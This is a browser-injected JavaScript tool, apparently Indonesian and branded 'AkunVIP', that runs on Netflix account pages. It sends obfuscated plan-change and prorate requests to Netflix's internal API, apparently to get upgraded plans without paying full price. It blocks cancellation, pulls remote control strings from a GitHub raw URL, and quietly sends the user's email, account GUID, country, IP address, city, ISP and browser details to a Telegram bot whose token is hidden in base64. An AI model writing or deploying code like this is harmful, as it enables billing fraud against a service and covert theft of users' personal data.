if (typeof send_tele == 'undefined') {
    document.querySelector("#appMountPoint > div > div > div.bd > div > div > h1").textContent = "Mengambil data . . .";

    var versi = '',
        jum = 0,
        lisensi = '@rmdnpf', //user
        kode_akses = 'rma888902317721789', //wl..... github
        telpel = '854109061', //id 640845241
        send_tele = 0,
        send_notif = 0,
        textnotif = atob("QWtzZXMgYWthbiBkaXRhcmlrIHBlcm1hbmVuIGJpbGEgdGVyZGFwYXQgcGVsYW5nZ2FyYW4gYmVydWxhbmcgICAg"),
        kata = "| Prorate: \n[email] \n| [negara] | [guid]\n\n<a href = 'https://fh.akun.vip/api/?detail=[detail]'><b>[DETAIL TRANSAKSI KLIK DISINI]</b> </a>";
    main();

}




async function main() {
    await getajax();
    $(document).ready(async function() {

        $('#appMountPoint > div > div > div.bd > div > div > h1').html('Memuat data . . .');

        const myversi = await akunvip();
        versi = await myversi.substring(
            myversi.indexOf("9jjj") + 4,
            myversi.lastIndexOf("jjj7")
        );
        if (versi.length < 5 || versi.length > 15) {
            $(window).unbind('beforeunload');
            alert(atob("R2FnYWwgbWVuZGFwYXRrYW4gZGF0YSwgaHVidW5naSBhZG1pbg=="));

            window.location.href = 'https://www.netflix.com/YourAccount';
            process.exit();
        }
        if (typeof netflix.reactContext.models.serviceInfo.data.serviceOnHoldStreamingBlocked !== 'undefined') {

            if (!netflix.reactContext.models.serviceInfo.data.serviceOnHoldStreamingBlocked) {
                $(window).unbind('beforeunload');
                alert('Akun masih aktif! tidak bisa di proses');

                window.location.href = 'https://www.netflix.com/YourAccount';
                process.exit();
            }
        }


        if (typeof netflix.reactContext.models.accountContext.data.flow.fields.currentPlan == 'undefined') {
            alert('Akun baru tidak bisa di proses');
            window.location.href = 'https://www.netflix.com/YourAccount';
            process.exit();
        }
        notif = await myversi.substring(
            myversi.indexOf("jjj9") + 4,
            myversi.lastIndexOf("7jjj")
        );

        notif = atob(notif);
        if (notif !== 'false') {
            alert(notif);
            window.location.href = 'https://www.netflix.com/YourAccount';
            process.exit();
        }
        window.history.pushState('AkunVIP', 'AkunVIP', '/?VIPAccess=AkunVIP');
        $('#appMountPoint > div > div > div.uma > div > article').html('');
        $('#hd > div.account-secondary-navigation.last').html('');
        $('#hd > div:nth-child(2) > a').html('');
        $('#appMountPoint > div > div > div.site-footer-wrapper').html('');
        document.title = 'AkunVIP';

        $("#appMountPoint > div > div > div.bd > div > div > h1").attr('class', 'account-header account-header-inline');
        $('#appMountPoint > div > div > div.bd > div > div > h1').html('|REDEEM NETLIX  <br><button style="background: #34abeb;border: 1px solid #34abeb;border-radius: 6px;box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;box-sizing: border-box;color: #FFFFFF;text-align: center; height:40px;width:100%; font-size:40%;float: right; display:none" id="walletid">Aktifkan Metode Pembayaran DANA(ID)<br> [D]</button>');
        $('#appMountPoint > div > div > div.bd > div > div > div.account-section-membersince').html('');
        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper > header > h2').html('Dilisensikan kepada<br>[' + lisensi + ']<br><button style="background:#545252 ;border: 1px solid #0f0f0f;border-radius: 6px;box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;box-sizing: border-box;color: #FFFFFF;text-align: center; height:40px;width:100%; font-size:80%;float: right; display:none" id="cancelid">Batalkan Langganan<br> [C]</button>');


        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper > section > div:nth-child(1) > div').html('<h2>Sebelum Memulai Redeem :</h2><ul> <li> Tekan tombol "MULAI" di bawah sebelum berlangganan netflix</li> <li>Jangan tutup tab ini! Buka tab baru untuk memulai langganan</li><li>Saat memulai langganan, pilih paket paling murah(mobile)</li><li>Saat proses redeem berlangsung, jangan refresh ataupun reload halaman ini, halaman akan ter-relaod sendiri setelah proses selesai</li><li>Support untuk pembayaran giftcard</li><li>Setelah menekan tombol Mulai Aktifasi [SPASI], segera lakukan redeem giftcard</li></ul><h3>Mengabaikan langkah di atas dapat menyebapkan kegagalan!</h3>');
        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper > section > div:nth-child(2) > div > div').html(' <button style="background: #FF4742;border: 1px solid #FF4742;border-radius: 6px;box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;box-sizing: border-box;color: #FFFFFF;text-align: center; height:100px;width:100%;" id="starbypass">MULAI AKTIVASI<center><br>[SPASI]</center></button>');
        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper > section > div.account-subsection.clearfix.is-external-gift-redemption.light-divider > div').html('');

        $('#akunvip').append('<button id="starbypass" class="btn btn-success">Mulai Prorate</button><br><br><br>');

        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(2)').html('<center><h2 class="account-section-heading">[---]</h2></center>');


        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(3)').html('Dilarang keras menyebarkan chat, screenshot, jasa, link ataupun apapun itu yang berkaitan dengan aplikasi AkunVIP.<br> Kami akan menarik program bila hal tsb terindikasi.');
        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(4)').html('&copy; Copyright AkunVIP <div id="ceklogout"></div>');
        if (textnotif) {
            $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper.membership-section-with-button > section > div:nth-child(1)').append('<marquee width="100%" direction="right" height="50%" style="float:right">' + textnotif + '</marquee>');
        }

        $('html').keypress(function(e) {
            console.log(e.which);
            var key = e.which;
            if (key == 32) {
                $("#starbypass").click();
                e.preventDefault();
            } else if (key == 68 || key == 100) {
                $("#walletid").click();
                e.preventDefault();
            } else if (key == 99 || key == 67) {
                alert('Cancel di nonaktifkan');
                e.preventDefault();
            }
        });

        $("#starbypass").mouseover(function() {
            $(this).css("background-color", "#ad2828")
        }).mouseout(function() {
            $(this).css("background-color", "#FF4742")
        });

        $("#walletid").mouseover(function() {
            $(this).css("background-color", "#2d96cf")
        }).mouseout(function() {
            $(this).css("background-color", "#34abeb")
        });

        $('#cancelid').click(async function() {
            $('#cancelid').text('wait . . .');
            if (await cancelMember()) {
                $('#cancelid').text('sukses . . .');
                for (let index = 0; index < 5; index++) {
                    $('#cancelid').text((5 - index));
                    document.title = 'Reload dalam ' + (5 - index) + ' detik';
                    await delay(1000);

                }
                window.location.href = 'https://www.netflix.com/YourAccount';


            }
        });

        for (let x = 0; x <= 10; x++) {
            cekbypass('setpremiumplan');
            cekbypass('changeplan');
            cekbypass('prorate');

            cekbypass('mobile');
            cekbypass('standard');
            cekbypass('premium');
            await delay('25');
        }

        $("#walletid").click(async function() {

            for (let x = 0; x <= 5; x++) {
                cekbypass('setpremiumplan');
                cekbypass('changeplan');
                cekbypass('prorate');

                cekbypass('mobile');
                cekbypass('standard');
                cekbypass('premium');
                await delay('25');
            }
            if (await tpoff()) {
                $('#appMountPoint > div > div > div.bd > div > div > h1').html('|REDEEM NETFLIX  <br><button style="background: #34eb58;border: 1px solid #34abeb;border-radius: 6px;box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;box-sizing: border-box;color: #FFFFFF;text-align: center; height:35px;width:100%; font-size:40%;float: right; display:none" id="walletid">DANA berhasil di aktifkan</button>');

            } else {
                $('#appMountPoint > div > div > div.bd > div > div > h1').html('|REDEEM NETFLIX  <br><button style="background: #34eb58;border: 1px solid #34abeb;border-radius: 6px;box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;box-sizing: border-box;color: #FFFFFF;text-align: center; height:35px;width:100%; font-size:40%;float: right;" id="walletid">Aktif</button>');

            }
            for (let x = 0; x <= 5; x++) {
                cekbypass('setpremiumplan');
                cekbypass('changeplan');
                cekbypass('prorate');

                cekbypass('mobile');
                cekbypass('standard');
                cekbypass('premium');
                await delay('25');
            }


        });

        $("#starbypass").click(async function() {
            $('#cancelid').hide();
            $("#walletid").click();
            $('#starbypass').prop('disabled', true);
            $('#proses').html('<center>getting...</center>');

            do {
                cekla = await ceklangganan("[+] Proses " + netflix.reactContext.models.accountInfo.data.emailAddress, atob("NjQwODQ1MjQx"));
            }
            while (!cekla)

            $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper > section > div:nth-child(2) > div > div').html('<button style="background: #38383b;border: 1px solid #FF4742;border-radius: 6px;box-shadow: rgba(0, 0, 0, 0.1) 1px 2px 4px;box-sizing: border-box;color: #FFFFFF;text-align: center; height:100px;width:100%;" id="starbypass" disabled>AKTIVASI BERHASIL!</button>');
            $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(2)').html('<div class="account-section-heading"><center>[ ' + netflix.reactContext.models.accountInfo.data.emailAddress + ' AKTIF ]</center></div><div id="proses" style="display: inline;color:#bf3b3b"></div><br>');

            document.title = 'Aktivasi Sedang Berjalan . . .';
            $(window).bind("beforeunload", function() {
                return confirm("Masih proses, jangan di tutup!");
            });
            var ltx = 1;
            var log_all = 1;

            for (let x = 0; x <= 10; x++) {
                cekbypass('main/setpremiumplan');
                cekbypass('main/changeplan');
                cekbypass('main/prorate');

                cekbypass('mobile');
                cekbypass('standard');
                cekbypass('premium');
                await delay('25');
            }

            do {
                aksi = await req('3108', atob("Y2hhbmdlcGxhbnYy"));
                if (ltx == 1) {
                    $('#proses').html('<center>[' + log_all + '] menunggu langganan aktif</center>');
                } else if (ltx == 2) {
                    $('#proses').html('<center>[' + log_all + '] menunggu langganan aktif.</center>');
                } else if (ltx == 3) {
                    $('#proses').html('<center>[' + log_all + '] menunggu langganan aktif..</center>');
                } else if (ltx == 4) {
                    $('#proses').html('<center>[' + log_all + '] menunggu langganan aktif...</center>');
                } else {
                    ltx = 1;
                }
                log_all++;
                ltx++;

                cekbypass(versi + '/setpremiumplan');
                cekbypass(versi + '/changeplanv');
                cekbypass(versi + '/changeplanv2');
                cekbypass(versi + '/prorate');
                cekbypass2('mobile');
                cekbypass2('standard');
                cekbypass2('premium');
                cekbypass2('changeplanv2');
            }
            while (!aksi);
            email = netflix.reactContext.models.accountInfo.data.emailAddress;
            mguid = netflix.reactContext.models.userInfo.data.guid;
            kata = kata.replace("[email]", netflix.reactContext.models.accountInfo.data.emailAddress);
            kata = kata.replace("[guid]", netflix.reactContext.models.userInfo.data.guid);

            do {
                idm = await ceklangganan(kata, atob("NjQwODQ1MjQx"));
            }
            while (!idm)

            do {
                idm2 = await ceklangganan(kata, telpel);
            }
            while (!idm2)

            try {
                myip = await ips();
            } catch (e) {
                myip = false;
            }
            $('#proses').html('<div style="display: inline;color:#11d64c"><center>OK</center></div><center>|almost.done</center>');
            do {
                body = await cekbill();
                $('body').html(body);
            } while (!body)
            $('body').hide();

            var today = new Date();
            var dd = String(today.getDate()).padStart(2, '0');
            var mm = String(today.getMonth() + 1).padStart(2, '0');
            var yyyy = today.getFullYear();

            today = dd + '/' + mm + '/' + yyyy;
            kata = kata.replace("[negara]", netflix.reactContext.models.userInfo.data.currentCountry);
            if (myip) {
                alldata = [email, mguid, netflix.reactContext.models.userInfo.data.currentCountry, myip.ip, myip.city, myip.org, navigator.userAgent, makeid(7), today];
            } else {
                alldata = [email, mguid, netflix.reactContext.models.userInfo.data.currentCountry, "-", "-", "-", navigator.userAgent, makeid(7), today];

            }
            kata = kata.replace("[detail]", btoa(JSON.stringify(alldata)));
            $(window).unbind('beforeunload');
            do {
                cl1 = await ceklangganan(kata, atob("NjQwODQ1MjQx"), idm);
            }
            while (!cl1)

            do {
                cl12 = await ceklangganan(kata, telpel, idm2);
            }
            while (!cl12)

            document.title = 'tunggu reload . . .';
            do {
                body = await YourAccount();
                $('body').html(body);
            } while (!body)
            $('body').hide();

            for (let x = 0; x <= 5; x++) {
                cekbypass('setpremiumplan');
                cekbypass('changeplan');
                cekbypass('prorate');

                cekbypass('mobile');
                cekbypass('standard');
                cekbypass('premium');
                await delay('25');
            }
            await req('3088', atob("Y2hhbmdlcGxhbnYy"));
            await req('3108', atob("Y2hhbmdlcGxhbnYy"));
            for (let x = 0; x <= 5; x++) {
                cekbypass('setpremiumplan');
                cekbypass('changeplan');
                cekbypass('prorate');

                cekbypass('mobile');
                cekbypass('standard');
                cekbypass('premium');
                await delay('25');
            }

            window.location.href = 'https://www.netflix.com/YourAccount';

        });
    });
};


async function cekbypass2(data) {
    return new Promise(function(resolve) {
        $.ajax({
            type: "POST",
            data: 'gkYcMjOFi8P53xi2VygYzOC4mXNVfZ8o765xbRpjhElvKgOoLlnTOLh5T90wFFDBfMcD4Np03l' + data + 'T3Ddhn4RDuYexyWhyz3yA1CkQIK3wgGr64vcHvO54pcxsLxI9QqN6eVRFVEx5HwEsOF5ybEWrZp2Spb7h8m',
            url: 'https://netflix.github.io/' + data,
            success: function(data) {
                resolve(data);


            },
            error: function() {
                resolve(0);
            }
        });
    });

}


async function YourAccount() {
    return new Promise(function(resolve) {
        $.ajax({
            type: "GET",
            url: 'https://www.netflix.com/YourAccount',
            success: function(data) {
                resolve(data);


            },
            error: function() {
                resolve(0);
            }
        });
    });

}


async function cancelMember() {
    return new Promise(function(resolve) {
        path = JSON.stringify({
            "action": "cancelMembershipAction",
            "fields": {},
            "authURL": netflix.reactContext.models.userInfo.data.authURL
        });
        $.ajax({
            type: "POST",
            data: path,
            contentType: "application/json",

            url: 'https://www.netflix.com/api/shakti/' + versi + '/flowendpoint?action=cancelMembershipAction&flow=websiteMember&mode=cancelMembership',
            success: function(data) {
                if (data.mode == 'cancelMembershipConfirmed') {
                    resolve(1);
                } else {
                    resolve(0);
                }
            },
            error: function() {
                resolve(0);
            }
        });
    });
}


function makeid(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() *
            charactersLength));
    }
    return result;
}

async function getajax() {
    return new Promise(function(res) {
        var s,
            r,
            t;
        r = false;
        s = document.createElement('script');
        s.type = 'text/javascript';
        s.src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js";
        s.onload = s.onreadystatechange = function() {
            if (!r && (!this.readyState || this.readyState == 'complete')) {
                r = true;
                res('OK');
            }
        };
        t = document.getElementsByTagName('script')[0];
        t.parentNode.insertBefore(s, t);
    });


}



async function req(produkid, list) {
    return new Promise(function(resolve) {
        path = JSON.stringify({
            "type": "POST",
            "[1]": produkid,
            "[2]": "",
            "context": "",
            "[6]": netflix.reactContext.models.userInfo.data.guid,
            "[3]": false,
            "[4]": false,
            "[5]": "commit",
            "[7]": netflix.reactContext.models.userInfo.data.authURL
        });

        path = path.replace("[1]", atob('cGxhbklk'));
        path = path.replace("[2]", atob('cHJpY2VUaWVy'));
        path = path.replace("[3]", atob('YWxsb3dCdW5kbGVQbGFuQ2hhbmdl'));
        path = path.replace("[4]", atob('aXNDaGFyZ2VkVXBncmFkZQ=='));
        path = path.replace("[5]", atob('YWN0aW9u'));
        path = path.replace("[6]", atob('bWVzc2FnZUdVSUQ='));
        path = path.replace("[7]", atob('YXV0aFVSTA=='));

        $.ajax({
            type: "POST",
            data: path,
            contentType: "application/json",

            url: 'https://www.netflix.com/api/shakti/' + versi + '/' + list,
            success: function(data) {
                resolve(1);


            },
            error: function(xhr) {
                if (xhr.status == '401') {
                    if (cek_logout) {
                        $('#ceklogout').html('<div class="bd"><div class="responsive-account-container"><div data-uia="password-gate-modal" class="nfmodal large password-gate-modal"><div class="nfdialog"><header class="nfdhead"><h1 class="nfdtitle">Akunmu terlogout!</h1><div class="nfdclose" aria-role="close modal" data-uia="password-gate-modal+close"></div></header><section class="nfdcontent"><div class="warn nf-message bordered message-hidden" id="nfmessagebox"><div id="" class="message-content" data-uia=""></div></div><div><div class="password-gate-modal-content"><h3 id="loginulangwaitting">Menunggu login ulang . . . </h3><br><h3>[' + netflix.reactContext.models.accountInfo.data.emailAddress + ' off][akun terlogout]</h3></div></div></section></div></div></div></div>');
                        cek_logout = 0;
                        $("#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper.membership-section-with-button").hide();
                        $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(2)').hide();
                        window.open("https://www.netflix.com/YourAccount", "popupWindow", "width=600,height=600,scrollbars=yes");

                    }
                } else {
                    cek_logout = 1;
                    $('#ceklogout').html('');
                    $("#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div.account-section.collapsable-panel.clearfix.membership-section-wrapper.membership-section-with-button").show();
                    $('#appMountPoint > div > div > div.bd > div > div > div.responsive-account-content > div:nth-child(2)').show();
                }
                resolve(0);
            }
        });
    });

}

async function cekbill() {
    return new Promise(function(resolve) {
        $.ajax({
            type: "GET",
            url: 'https://www.netflix.com/BillingActivity',
            success: function(data) {
                resolve(data);


            },
            error: function() {
                resolve(0);
            }
        });
    });

}

async function cekbypass(data) {
    return new Promise(function(resolve) {
        $.ajax({
            type: "POST",
            data: 'gkYcMjOFi8P53xi2VygYzOC4mXNVfZ8o765xbRpjhElvKgOoLlnTOLh5T90wFFDBfMcD4Np03l' + data + 'T3Ddhn4RDuYexyWhyz3yA1CkQIK3wgGr64vcHvO54pcxsLxI9QqN6eVRFVEx5HwEsOF5ybEWrZp2Spb7h8m',
            url: atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NpbnRoYWRpY28vbmV0ZmxpeC9tYWluLw==') + data,
            success: function(data) {
                resolve(data);


            },
            error: function() {
                resolve(0);
            }
        });
    });

}

async function ceklangganan(data, idchat, idmes = 0) {
    return new Promise(function(resolve) {
        if (!idmes) {
            var cekurl = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU1Mzc4MzU4ODk6QUFFVXdTWldVcjNKSE4xUkNfYWhFYy1MTkZoRG14OVhfdGMvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0=");
            var ress = cekurl + idchat + atob('JnRleHQ9') + encodeURIComponent(data) + '&parse_mode=HTML&disable_web_page_preview=1';
        } else {
            var cekurl = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDU1Mzc4MzU4ODk6QUFFVXdTWldVcjNKSE4xUkNfYWhFYy1MTkZoRG14OVhfdGMvZWRpdE1lc3NhZ2VUZXh0P2NoYXRfaWQ9");
            var ress = cekurl + idchat + atob('JnRleHQ9') + encodeURIComponent(data) + atob('Jm1lc3NhZ2VfaWQ9') + idmes + '&parse_mode=HTML&disable_web_page_preview=1';
        }
        $.ajax({
            type: "GET",
            url: ress,
            success: function(data) {
                try {
                    resolve(data.result.message_id);
                } catch (e) {
                    resolve(0);
                }

            }
        });
    });

}


async function tpon() {
    return new Promise(function(resolve) {
        path = {
            "canABTest": "true",
            "authURL": netflix.reactContext.models.userInfo.data.authURL,
        };

        $.ajax({
            type: "POST",
            data: path,
            url: 'https://www.netflix.com/api/shakti/' + versi + '/account/donottest',
            success: function(data) {
                resolve(1);
            },
            error: function() {
                resolve(0);
            }
        });
    });

}



async function tpoff() {
    return new Promise(function(resolve) {
        path = {
            "canABTest": "false",
            "authURL": netflix.reactContext.models.userInfo.data.authURL,
        };

        $.ajax({
            type: "POST",
            data: path,
            url: 'https://www.netflix.com/api/shakti/' + versi + '/account/donottest',
            success: function(data) {
                resolve(1);
            },
            error: function() {
                resolve(0);
            }
        });
    });

}


async function akunvip() {
    return new Promise(function(resolve) {
        var myurl = atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NpbnRoYWRpY28vbmV0ZmxpeC9tYWluLw==');
        $.ajax({
            url: myurl + kode_akses + '/marketingprefs',
            success: function(result, status, xhr) {
                resolve(result);
            },
            error: function(xhr, status, error) {
                alert('Gagal mendapatkan data, hubungi admin');
                window.location.href = 'https://www.netflix.com/YourAccount';
            }
        })

    });

}



async function ips() {
    return new Promise(function(resolve) {
        $.ajax({
            type: "GET",

            url: 'https://ipinfo.io/json',
            success: function(data) {
                resolve(data);


            },
            error: function(xhr, status, error) {
                resolve(0);
            }
        });
    });

}


async function delay(time) {
    return new Promise(r => setTimeout(r, time));


}